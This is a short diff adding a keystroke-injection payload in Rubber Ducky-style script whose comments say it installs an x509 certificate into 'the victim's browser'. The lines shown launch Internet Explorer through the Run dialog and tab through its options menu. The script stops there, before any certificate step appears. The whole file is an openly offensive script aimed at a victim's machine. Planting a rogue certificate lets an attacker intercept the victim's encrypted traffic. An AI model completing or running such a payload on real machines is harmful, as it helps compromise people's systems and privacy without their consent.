@@ -1,0 +1,19 @@
+REM Installing x509 into the victim's browser
+REM Note: requires that internet explorer be the only active browser on the machine
+
+DELAY 1000
+GUI r
+STRING Internet Explorer
+DELAY 100
+ENTER
+ALT O
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+
